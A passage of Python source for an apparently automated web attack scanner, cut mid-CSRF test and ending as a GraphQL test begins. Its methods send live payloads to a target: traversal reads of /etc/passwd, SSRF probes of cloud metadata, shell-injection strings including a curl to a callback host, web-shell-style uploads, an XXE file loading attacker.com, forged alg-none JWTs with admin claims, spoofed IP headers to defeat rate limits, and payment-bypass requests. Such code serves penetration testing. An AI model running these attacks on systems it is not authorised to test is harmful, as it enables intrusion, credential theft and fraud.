        for endpoint in state_change_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            try:
                valid_data = {"name": "Test Update", "email": self.login_credential or "test@example.com"}
                valid_resp = self._request('POST', endpoint, json=valid_data, timeout=3)
                if self.is_blocked(valid_resp):
                    consecutive_blocks += 1
                    continue
                if valid_resp.status_code == 200:
                    headers = get_stealth_headers()
                    invalid_resp = requests.post(endpoint, json=valid_data, headers=headers, timeout=3)
                    if self.is_blocked(invalid_resp):
                        consecutive_blocks += 1
                        continue
                    if invalid_resp.status_code == 200:
                        self.log(f"  ⚠️ State change possible without auth token at {endpoint}!", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="CSRF / Missing Authentication",
                            endpoint=endpoint,
                            payload="POST without auth",
                            response={'note': 'Endpoint accepts requests without authentication'}
                        )
                        details.append(f"CSRF at {endpoint}")
                        break
            except Exception:
                continue

        self.test_summary["CSRF"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No CSRF vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Open Redirect test (as before)
    # ----------------------------------------------------------------------
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        self.log("🔍 Testing Open Redirect Vulnerabilities...")
        vulnerable = False
        details = []

        redirect_params = ['redirect', 'return', 'next', 'url', 'goto', 'target', 'destination', 'returnTo']
        redirect_endpoints = []
        for url in self.discovered_endpoints:
            if any(param in url.lower() for param in redirect_params):
                redirect_endpoints.append(url)
        if not redirect_endpoints:
            templates = [
                f"{self.base_url}/redirect?url=",
                f"{self.base_url}/logout?returnTo=",
                f"{self.base_url}/login?next=",
                f"{self.base_url}/auth?redirect=",
                f"{self.base_url}/api/redirect?url="
            ]
            redirect_endpoints = templates

        payloads = [
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "https:evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
            "\\evil.com",
            "https://evil.com@good.com"
        ]

        consecutive_blocks = 0
        for endpoint in redirect_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            for payload in payloads:
                if consecutive_blocks >= 3:
                    break
                try:
                    if '?' in endpoint:
                        url = endpoint + payload
                    else:
                        url = endpoint + payload
                    resp = self._request('GET', url, allow_redirects=False, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or 'javascript:' in location:
                            self.log(f"  ⚠️ Open redirect at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Open Redirect",
                                endpoint=endpoint,
                                payload=payload,
                                request=resp._request_info,
                                response={
                                    'status_code': resp.status_code,
                                    'headers': dict(resp.headers),
                                    'redirects_to': location
                                }
                            )
                            details.append(f"Open redirect at {endpoint} with {payload}")
                            break
                except Exception:
                    continue

        self.test_summary["Open Redirect"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No open redirects found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Directory Traversal test (as before)
    # ----------------------------------------------------------------------
    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        self.log("🔍 Testing Directory Traversal...")
        vulnerable = False
        details = []

        file_params = ['file', 'path', 'document', 'download', 'view', 'get']
        traversal_endpoints = []
        for url in self.discovered_endpoints:
            if any(param in url.lower() for param in file_params):
                traversal_endpoints.append(url)
        if not traversal_endpoints:
            templates = [
                f"{self.base_url}/api/file?path=",
                f"{self.base_url}/download?file=",
                f"{self.base_url}/view?doc=",
                f"{self.base_url}/get?document="
            ]
            traversal_endpoints = templates

        traversal_payloads = [
            "../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..;/etc/passwd",
            "../etc/passwd%00",
            "file:///etc/passwd"
        ]

        success_markers = ["root:", "nobody:", "daemon:", "bin:", "[extensions]", "127.0.0.1", "localhost"]

        consecutive_blocks = 0
        for endpoint in traversal_endpoints:
            if consecutive_blocks >= 3:
                break
            self.log(f"  Testing {endpoint}")
            for payload in traversal_payloads:
                if consecutive_blocks >= 3:
                    break
                try:
                    url = endpoint + payload
                    resp = self._request('GET', url, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        content = resp.text
                        found_markers = [m for m in success_markers if m in content]
                        if found_markers:
                            self.log(f"  ⚠️ Directory traversal at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Directory Traversal",
                                endpoint=endpoint,
                                payload=payload,
                                request=resp._request_info,
                                response=resp,
                                extra={'indicators_found': found_markers}
                            )
                            details.append(f"Directory traversal at {endpoint} with {payload}")
                            break
                except Exception:
                    continue

        self.test_summary["Directory Traversal"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No directory traversal found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: SSRF (enhanced with out-of-band)
    # ----------------------------------------------------------------------
    def test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities with out-of-band support"""
        self.log("🔍 Testing SSRF vulnerabilities (enhanced)...")
        vulnerable = False
        details = []

        # SSRF payloads
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",          # GCP
            "http://169.254.169.254/metadata/",         # Azure
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:5432/",
            "http://localhost/",
            "file:///etc/passwd",
            "gopher://localhost:8080/_GET / HTTP/1.0",
            "dict://localhost:11211/",
            "http://[::1]:80/",
            "http://0.0.0.0:80/",
            "http://internal.service.local/",
        ]

        # Add out-of-band callback if provided
        if self.callback_url:
            ssrf_payloads.append(self.callback_url)
            # Also add DNS callback
            parsed = urlparse(self.callback_url)
            if parsed.netloc:
                ssrf_payloads.append(f"http://{parsed.netloc}/ssrf-test")

        # Find potential SSRF endpoints
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'return', 
                      'out', 'view', 'dir', 'show', 'file', 'document', 
                      'folder', 'root', 'path', 'load', 'read', 'data', 'link', 'src', 'href']
        
        test_endpoints = []
        for url, methods in self.discovered_endpoints.items():
            for method, params in methods.items():
                if any(param in ssrf_params for param in params):
                    test_endpoints.append((url, method, list(params)))

        if not test_endpoints:
            templates = [
                f"{self.base_url}/api/fetch?url=",
                f"{self.base_url}/proxy?url=",
                f"{self.base_url}/api/load?url=",
                f"{self.base_url}/external?url=",
                f"{self.base_url}/webhook?url=",
                f"{self.base_url}/api/image?url=",
                f"{self.base_url}/api/redirect?url=",
            ]
            for template in templates:
                test_endpoints.append((template, 'GET', ['url']))

        # Run tests
        for endpoint, method, params in test_endpoints:
            if self.block_counter.get(endpoint, 0) >= 3:
                continue

            for param in params:
                for payload in ssrf_payloads:
                    try:
                        if method == 'GET':
                            resp = self._request('GET', endpoint, params={param: payload}, timeout=5)
                        else:
                            resp = self._request('POST', endpoint, json={param: payload}, timeout=5)

                        if self.is_blocked(resp):
                            self.block_counter[endpoint] = self.block_counter.get(endpoint, 0) + 1
                            continue

                        content = resp.text.lower()
                        ssrf_indicators = [
                            'root:', 'aws-ec2', 'instance-id', 'public-keys',
                            'security-credentials', 'iam/', 'meta-data/',
                            'computeMetadata', 'ssh-rsa', 'mysql', 'postgresql',
                            'internal service', 'localhost', 'connection refused'
                        ]
                        
                        found_indicators = [i for i in ssrf_indicators if i in content]
                        
                        if found_indicators or any(i in content for i in ['root:', 'aws-ec2']):
                            self.log(f"  ⚠️ Potential SSRF at {endpoint} via {param}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="SSRF",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=resp._request_info,
                                response=resp,
                                extra={'indicators': found_indicators}
                            )
                            details.append(f"SSRF via {param} at {endpoint}")
                            break

                        # Check for out-of-band callback (simplified - would need external verification)
                        if self.callback_url and payload == self.callback_url:
                            self.log(f"  ⚠️ OOB SSRF payload sent to {endpoint} via {param}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="SSRF (Out-of-Band)",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=resp._request_info,
                                response={'note': 'OOB payload sent, check callback server'}
                            )
                            details.append(f"OOB SSRF via {param} at {endpoint}")
                            break

                    except Exception as e:
                        continue

        self.test_summary["SSRF"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No SSRF vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: Command Injection (enhanced with time-based & OOB)
    # ----------------------------------------------------------------------
    def test_command_injection(self):
        """Test for Command Injection vulnerabilities with time-based and OOB"""
        self.log("🔍 Testing Command Injection (enhanced)...")
        vulnerable = False
        details = []

        cmd_payloads = [
            ("; ls", "bin|etc|usr"),
            ("| ls", "bin|etc|usr"),
            ("& ls", "bin|etc|usr"),
            ("&& ls", "bin|etc|usr"),
            ("`ls`", "bin|etc|usr"),
            ("$(ls)", "bin|etc|usr"),
            ("; pwd", "/"),
            ("| pwd", "/"),
            ("; whoami", "root|user|admin"),
            ("| whoami", "root|user|admin"),
            ("; echo vulnerable", "vulnerable"),
            ("| echo vulnerable", "vulnerable"),
            ("%3B ls", "bin|etc|usr"),
            ("%7C ls", "bin|etc|usr"),
            ("; cat /etc/passwd", "root:"),
            ("| cat /etc/passwd", "root:"),
            ("; sleep 5", "time", 5),  # time-based
            ("| sleep 5", "time", 5),
            ("& sleep 5", "time", 5),
            ("&& sleep 5", "time", 5),
        ]

        # Add OOB payload if callback URL provided
        if self.callback_url:
            oob_cmd = f"; curl {self.callback_url}/cmd"
            cmd_payloads.append((oob_cmd, "oob"))

        cmd_params = ['cmd', 'command', 'exec', 'execute', 'ping', 'traceroute',
                     'nslookup', 'dig', 'host', 'system', 'shell', 'bash',
                     'wget', 'curl', 'download', 'upload', 'hostname', 'ip']

        test_endpoints = []
        for url, methods in self.discovered_endpoints.items():
            for method, params in methods.items():
                if any(param in cmd_params for param in params):
                    test_endpoints.append((url, method, list(params)))

        if not test_endpoints:
            templates = [
                f"{self.base_url}/api/ping?host=",
                f"{self.base_url}/api/exec?cmd=",
                f"{self.base_url}/api/command?cmd=",
                f"{self.base_url}/api/dns?domain=",
                f"{self.base_url}/api/traceroute?host=",
                f"{self.base_url}/cgi-bin/ping?host=",
            ]
            for template in templates:
                test_endpoints.append((template, 'GET', ['host', 'cmd', 'domain']))

        for endpoint, method, params in test_endpoints:
            if self.block_counter.get(endpoint, 0) >= 3:
                continue

            for param in params:
                for payload_data in cmd_payloads:
                    if len(payload_data) == 2:
                        payload, success_indicator = payload_data
                        time_based = False
                    else:
                        payload, success_indicator, delay = payload_data
                        time_based = True

                    try:
                        start = time.time()
                        if method == 'GET':
                            resp = self._request('GET', endpoint, params={param: payload}, timeout=delay+3 if time_based else 5)
                        else:
                            resp = self._request('POST', endpoint, json={param: payload}, timeout=delay+3 if time_based else 5)

                        if self.is_blocked(resp):
                            self.block_counter[endpoint] = self.block_counter.get(endpoint, 0) + 1
                            continue

                        elapsed = time.time() - start

                        if time_based and elapsed >= delay - 1:
                            self.log(f"  ⚠️ Time-based Command Injection at {endpoint} via {param}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Command Injection (Time-based)",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=resp._request_info,
                                response=resp,
                                extra={'response_time': elapsed}
                            )
                            details.append(f"Time-based Command Injection via {param} at {endpoint}")
                            break
                        elif not time_based and re.search(success_indicator, resp.text.lower()):
                            self.log(f"  ⚠️ Command Injection at {endpoint} via {param}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Command Injection",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=resp._request_info,
                                response=resp
                            )
                            details.append(f"Command Injection via {param} at {endpoint}")
                            break
                        elif success_indicator == "oob" and self.callback_url:
                            self.log(f"  ⚠️ OOB Command Injection payload sent to {endpoint} via {param}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Command Injection (Out-of-Band)",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=resp._request_info,
                                response={'note': 'OOB payload sent, check callback server'}
                            )
                            details.append(f"OOB Command Injection via {param} at {endpoint}")
                            break

                    except requests.exceptions.Timeout:
                        if time_based and delay >= 5:
                            self.log(f"  ⚠️ Time-based Command Injection (timeout) at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Command Injection (Time-based - Timeout)",
                                endpoint=endpoint,
                                payload=payload,
                                parameter=param,
                                request=None,
                                response={'error': 'timeout'}
                            )
                            details.append(f"Timeout on time-based payload at {endpoint}")
                            break
                    except Exception:
                        continue

        self.test_summary["Command Injection"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No Command Injection vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: File Upload Vulnerabilities (enhanced)
    # ----------------------------------------------------------------------
    def test_file_upload(self):
        """Test for File Upload vulnerabilities with multiple bypass techniques"""
        self.log("🔍 Testing File Upload vulnerabilities...")
        vulnerable = False
        details = []

        upload_patterns = ['upload', 'file', 'image', 'avatar', 'profile', 
                          'document', 'attachment', 'media', 'photo', 'picture']
        
        upload_endpoints = []
        for url, methods in self.discovered_endpoints.items():
            if any(pattern in url.lower() for pattern in upload_patterns):
                upload_endpoints.append(url)

        if not upload_endpoints:
            templates = [
                f"{self.base_url}/api/upload",
                f"{self.base_url}/upload",
                f"{self.base_url}/api/image/upload",
                f"{self.base_url}/api/file/upload",
                f"{self.base_url}/profile/avatar",
                f"{self.base_url}/api/avatar",
                f"{self.base_url}/media/upload",
            ]
            upload_endpoints = templates

        malicious_files = [
            {
                'name': 'test.php',
                'content': '<?php echo "VULNERABLE"; ?>',
                'type': 'application/x-php'
            },
            {
                'name': 'test.jsp',
                'content': '<% out.println("VULNERABLE"); %>',
                'type': 'application/x-jsp'
            },
            {
                'name': 'test.aspx',
                'content': '<%@ Page Language="C#" %><% Response.Write("VULNERABLE"); %>',
                'type': 'application/x-aspx'
            },
            {
                'name': 'test.phtml',
                'content': '<?php echo "VULNERABLE"; ?>',
                'type': 'application/x-httpd-php'
            },
            {
                'name': 'test.php5',
                'content': '<?php echo "VULNERABLE"; ?>',
                'type': 'application/x-httpd-php'
            },
            {
                'name': 'test.svg',
                'content': '<?xml version="1.0" standalone="no"?><!DOCTYPE svg [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"/>',
                'type': 'image/svg+xml'
            },
            {
                'name': 'test.html',
                'content': '<script>alert("XSS")</script>',
                'type': 'text/html'
            }
        ]

        double_ext_files = [
            'test.php.jpg',
            'test.php.jpeg',
            'test.php.png',
            'test.php;.jpg',
            'test.php%00.jpg',
            'test.php\x00.jpg',
            'test.asp.jpg',
            'test.aspx.jpg',
            'test.jsp.jpg'
        ]

        for endpoint in upload_endpoints:
            if self.block_counter.get(endpoint, 0) >= 3:
                continue

            self.log(f"  Testing upload at {endpoint}")

            for mal_file in malicious_files:
                try:
                    files = {
                        'file': (mal_file['name'], mal_file['content'], mal_file['type'])
                    }
                    
                    resp = self._request('POST', endpoint, files=files, timeout=5)
                    
                    if self.is_blocked(resp):
                        self.block_counter[endpoint] = self.block_counter.get(endpoint, 0) + 1
                        continue

                    content = resp.text.lower()
                    if resp.status_code == 200 and ('success' in content or 'uploaded' in content or 'saved' in content):
                        self.log(f"  ⚠️ File upload vulnerability at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="File Upload Vulnerability",
                            endpoint=endpoint,
                            payload=mal_file['name'],
                            request=resp._request_info,
                            response=resp
                        )
                        details.append(f"Malicious file upload: {mal_file['name']}")
                        break

                except Exception as e:
                    continue

            for filename in double_ext_files:
                try:
                    files = {
                        'file': (filename, 'test content', 'image/jpeg')
                    }
                    
                    resp = self._request('POST', endpoint, files=files, timeout=5)
                    
                    if resp.status_code == 200 and ('uploaded' in resp.text.lower() or 'saved' in resp.text.lower()):
                        self.log(f"  ⚠️ Double extension bypass at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="File Upload Vulnerability (Extension Bypass)",
                            endpoint=endpoint,
                            payload=filename,
                            request=resp._request_info,
                            response=resp
                        )
                        details.append(f"Extension bypass: {filename}")
                        break

                except Exception:
                    continue

        self.test_summary["File Upload"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No File Upload vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: Rate Limiting Bypass (enhanced)
    # ----------------------------------------------------------------------
    def test_rate_limiting_bypass(self):
        """Test for Rate Limiting bypass techniques"""
        self.log("🔍 Testing Rate Limiting Bypass...")
        vulnerable = False
        details = []

        rate_limit_endpoints = []
        for url in self.discovered_endpoints:
            if any(pattern in url.lower() for pattern in ['login', 'auth', 'register', 'signup', 
                                                          'forgot', 'reset', '2fa', 'verify', 'otp']):
                rate_limit_endpoints.append(url)

        if not rate_limit_endpoints:
            rate_limit_endpoints = [
                f"{self.base_url}/api/login",
                f"{self.base_url}/api/register",
                f"{self.base_url}/api/forgot-password",
                f"{self.base_url}/login",
                f"{self.base_url}/register",
                f"{self.base_url}/api/verify-otp"
            ]

        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '10.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'X-Forwarded-Server': '127.0.0.1'},
            {'X-Forwarded-For': random_ip()},
            {'X-Real-IP': random_ip()},
        ]

        for endpoint in rate_limit_endpoints:
            self.log(f"  Testing rate limiting at {endpoint}")

            try:
                blocked_count = 0
                for i in range(30):
                    resp = self._request('GET', endpoint, timeout=2)
                    if resp.status_code == 429 or self.is_blocked(resp):
                        blocked_count += 1
                    time.sleep(0.1)

                if blocked_count == 0:
                    self.log(f"  ⚠️ No rate limiting detected at {endpoint}", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Missing Rate Limiting",
                        endpoint=endpoint,
                        payload="30 rapid requests",
                        response={'detail': 'All requests succeeded'}
                    )
                    details.append(f"No rate limiting at {endpoint}")
                    continue

                for headers in bypass_headers:
                    bypass_success = 0
                    for i in range(20):
                        test_headers = get_stealth_headers()
                        test_headers.update(headers)
                        resp = self._request('GET', endpoint, headers=test_headers, timeout=2)
                        if resp.status_code != 429 and not self.is_blocked(resp):
                            bypass_success += 1
                        time.sleep(0.05)

                    if bypass_success > 15:
                        self.log(f"  ⚠️ Rate limiting bypass possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Rate Limiting Bypass",
                            endpoint=endpoint,
                            payload=str(headers),
                            response={'bypass_success_rate': f"{bypass_success}/20"}
                        )
                        details.append(f"Rate limiting bypass at {endpoint} with {list(headers.keys())[0]}")
                        break

            except Exception as e:
                self.log(f"  Error testing rate limiting: {e}", "ERROR")

        self.test_summary["Rate Limiting"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "Rate limiting properly configured"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: JWT Attacks (enhanced)
    # ----------------------------------------------------------------------
    def test_jwt_attacks(self):
        """Test for JWT vulnerabilities with comprehensive checks"""
        self.log("🔍 Testing JWT Attacks...")
        vulnerable = False
        details = []

        jwt_token = None
        auth_header = self.session.headers.get('Authorization', '')
        if auth_header and 'bearer' in auth_header.lower():
            jwt_token = auth_header.split(' ')[1]

        if not jwt_token and self.login_credential:
            self.log("  No JWT token found, attempting to get one...")
            self.attempt_login()
            auth_header = self.session.headers.get('Authorization', '')
            if auth_header and 'bearer' in auth_header.lower():
                jwt_token = auth_header.split(' ')[1]

        if not jwt_token:
            self.log("  No JWT token available, skipping JWT tests")
            self.test_summary["JWT Attacks"] = {
                "status": "SKIPPED",
                "details": "No JWT token available for testing"
            }
            return False

        try:
            header = jwt.get_unverified_header(jwt_token)
            payload = jwt.decode(jwt_token, options={"verify_signature": False})

            self.log(f"  JWT Header: {json.dumps(header)}")
            self.log(f"  JWT Payload: {json.dumps(payload)}")

            if header.get('alg') in ['none', 'NONE', 'None']:
                self.log(f"  ⚠️ JWT uses 'none' algorithm!", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="JWT Weakness",
                    endpoint="JWT Token",
                    payload="alg=none",
                    response={'header': header}
                )
                details.append("JWT uses 'none' algorithm")

            if header.get('alg') == 'RS256':
                try:
                    jwks_url = urljoin(self.base_url, '/.well-known/jwks.json')
                    resp = self._request('GET', jwks_url, timeout=3)
                    if resp.status_code == 200:
                        jwks = resp.json()
                        # Simplified - in real attack would need to extract public key
                        self.log(f"  ⚠️ JWKS endpoint exposed, potential algorithm confusion", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="JWT Weakness (Algorithm Confusion)",
                            endpoint="JWT Token",
                            payload="JWKS exposed",
                            response={'jwks': jwks}
                        )
                        details.append("JWKS endpoint exposed")
                except Exception:
                    pass

            modified_payload = payload.copy()
            if 'user_id' in modified_payload:
                modified_payload['user_id'] = 'admin'
            if 'role' in modified_payload:
                modified_payload['role'] = 'admin'
            if 'admin' in modified_payload:
                modified_payload['admin'] = True
            if 'email' in modified_payload:
                modified_payload['email'] = 'admin@example.com'

            attacks = [
                jwt_token.split('.')[0] + '.' + jwt_token.split('.')[1] + '.',
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.' + base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).decode().strip('=') + '.',
                jwt_token.split('.')[0] + '.' + jwt_token.split('.')[1] + '.null',
                jwt_token.split('.')[0] + '.' + jwt_token.split('.')[1] + '.',
            ]

            for attack_token in attacks:
                try:
                    headers = {'Authorization': f'Bearer {attack_token}'}
                    resp = self._request('GET', self.base_url, headers=headers, timeout=3)
                    
                    if resp.status_code == 200:
                        self.log(f"  ⚠️ JWT signature verification missing!", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="JWT Weakness (Missing Signature Verification)",
                            endpoint="JWT Token",
                            payload=attack_token[:50],
                            response={'detail': 'Token accepted without valid signature'}
                        )
                        details.append("JWT missing signature verification")
                        break
                except Exception:
                    continue

            sensitive_fields = ['password', 'secret', 'credit', 'ssn', 'token', 'api_key', 'private']
            found_sensitive = [f for f in sensitive_fields if f in json.dumps(payload).lower()]
            if found_sensitive:
                self.log(f"  ⚠️ Sensitive data in JWT payload!", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="JWT Weakness (Sensitive Data Exposure)",
                    endpoint="JWT Token",
                    payload=str(found_sensitive),
                    response={'payload': payload}
                )
                details.append(f"Sensitive data in JWT: {found_sensitive}")

        except Exception as e:
            self.log(f"  Error testing JWT: {e}", "ERROR")

        self.test_summary["JWT Attacks"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No JWT vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: Prototype Pollution (enhanced)
    # ----------------------------------------------------------------------
    def test_prototype_pollution(self):
        """Test for Prototype Pollution vulnerabilities"""
        self.log("🔍 Testing Prototype Pollution...")
        vulnerable = False
        details = []

        pollution_payloads = [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}},
            {"__proto__": {"admin": True}},
            {"__proto__.polluted": "true"},
            {"__proto__[polluted]": "true"},
            {"__proto__": {"isAdmin": True}},
            {"__proto__.isAdmin": True},
            {"__proto__": {"polluted": "VULNERABLE"}},
            {"constructor.prototype.polluted": "true"},
        ]

        json_endpoints = []
        for url, methods in self.discovered_endpoints.items():
            if 'POST' in methods or 'PUT' in methods or 'PATCH' in methods:
                json_endpoints.append(url)

        if not json_endpoints:
            json_endpoints = [
                f"{self.base_url}/api/user",
                f"{self.base_url}/api/profile",
                f"{self.base_url}/api/settings",
                f"{self.base_url}/api/config",
                f"{self.base_url}/api/data",
                f"{self.base_url}/api/update",
            ]

        pollution_headers = ['X-Polluted', 'Polluted', '__proto__', 'constructor']

        for endpoint in json_endpoints:
            if self.block_counter.get(endpoint, 0) >= 3:
                continue

            self.log(f"  Testing prototype pollution at {endpoint}")

            for payload in pollution_payloads:
                try:
                    resp = self._request('POST', endpoint, json=payload, timeout=5)
                    
                    if self.is_blocked(resp):
                        self.block_counter[endpoint] = self.block_counter.get(endpoint, 0) + 1
                        continue

                    content = resp.text.lower()
                    response_headers = resp.headers

                    if 'true' in content or 'polluted' in content or 'vulnerable' in content:
                        self.log(f"  ⚠️ Possible prototype pollution at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Prototype Pollution",
                            endpoint=endpoint,
                            payload=str(payload),
                            request=resp._request_info,
                            response=resp
                        )
                        details.append(f"Prototype pollution at {endpoint}")
                        break

                    for header in pollution_headers:
                        if header in response_headers:
                            self.log(f"  ⚠️ Pollution header reflected at {endpoint}", "WARNING")
                            vulnerable = True
                            details.append(f"Pollution header {header} reflected")
                            break

                except Exception as e:
                    continue

        if not vulnerable:
            for endpoint in json_endpoints[:5]:
                try:
                    pollution_param = "__proto__[polluted]=true"
                    resp = self._request('GET', endpoint, params=pollution_param, timeout=3)
                    
                    if 'true' in resp.text.lower() or 'polluted' in resp.text.lower():
                        self.log(f"  ⚠️ Client-side prototype pollution possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Prototype Pollution (Client-side)",
                            endpoint=endpoint,
                            payload=pollution_param,
                            response=resp
                        )
                        details.append(f"Client-side pollution at {endpoint}")
                        break
                except Exception:
                    continue

        self.test_summary["Prototype Pollution"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No prototype pollution found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: Business Logic Flaws (enhanced)
    # ----------------------------------------------------------------------
    def test_business_logic_flaws(self):
        """Test for Business Logic vulnerabilities"""
        self.log("🔍 Testing Business Logic Flaws...")
        vulnerable = False
        details = []

        logic_tests = [
            {
                'name': 'Negative Quantity',
                'endpoints': ['/api/cart/add', '/api/order', '/api/checkout', '/api/cart/update'],
                'payload': {'product_id': 1, 'quantity': -5, 'price': 100}
            },
            {
                'name': 'Price Manipulation',
                'endpoints': ['/api/cart/add', '/api/order', '/api/checkout', '/api/cart/update'],
                'payload': {'product_id': 1, 'quantity': 1, 'price': 0.01}
            },
            {
                'name': 'Coupon Abuse',
                'endpoints': ['/api/cart/apply-coupon', '/api/checkout/coupon', '/api/coupon/apply'],
                'payload': {'coupon': 'TEST50', 'apply_multiple': True}
            },
            {
                'name': 'Quantity Overflow',
                'endpoints': ['/api/cart/add', '/api/order', '/api/cart/update'],
                'payload': {'product_id': 1, 'quantity': 999999999}
            },
            {
                'name': 'Privilege Escalation',
                'endpoints': ['/api/user/role', '/api/admin/access', '/api/user/update-role'],
                'payload': {'user_id': '1', 'role': 'admin'}
            },
            {
                'name': 'Parameter Tampering',
                'endpoints': ['/api/order/confirm', '/api/payment/process', '/api/checkout/finalize'],
                'payload': {'order_id': 123, 'amount': 1, 'original_amount': 1000}
            },
            {
                'name': 'Payment Bypass',
                'endpoints': ['/api/order/complete', '/api/checkout/finalize', '/api/payment/skip'],
                'payload': {'order_id': 123, 'paid': True, 'skip_payment': True}
            },
            {
                'name': 'Gift Card Manipulation',
                'endpoints': ['/api/gift/redeem', '/api/gift/balance'],
                'payload': {'code': 'GIFT123', 'amount': 1000000}
            }
        ]

        for test in logic_tests:
            for endpoint_template in test['endpoints']:
                endpoint = urljoin(self.base_url, endpoint_template)
                
                try:
                    resp = self._request('POST', endpoint, json=test['payload'], timeout=5)

                    if self.is_blocked(resp):
                        continue

                    content = resp.text.lower()
                    success_indicators = ['success', 'confirmed', 'updated', 'processed', 'completed', 'applied']
                    
                    if resp.status_code == 200 and any(indicator in content for indicator in success_indicators):
                        self.log(f"  ⚠️ Business logic flaw: {test['name']} at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Business Logic Flaw",
                            endpoint=endpoint,
                            payload=json.dumps(test['payload']),
                            parameter=test['name'],
                            request=resp._request_info,
                            response=resp
                        )
                        details.append(f"{test['name']} at {endpoint}")
                        break

                except Exception as e:
                    continue

        self.test_summary["Business Logic"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No business logic flaws found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # NEW TEST: GraphQL Security (enhanced)
    # ----------------------------------------------------------------------
    def test_graphql_security(self):
        """Test for GraphQL security issues"""
        self.log("🔍 Testing GraphQL Security...")
        vulnerable = False
        details = []

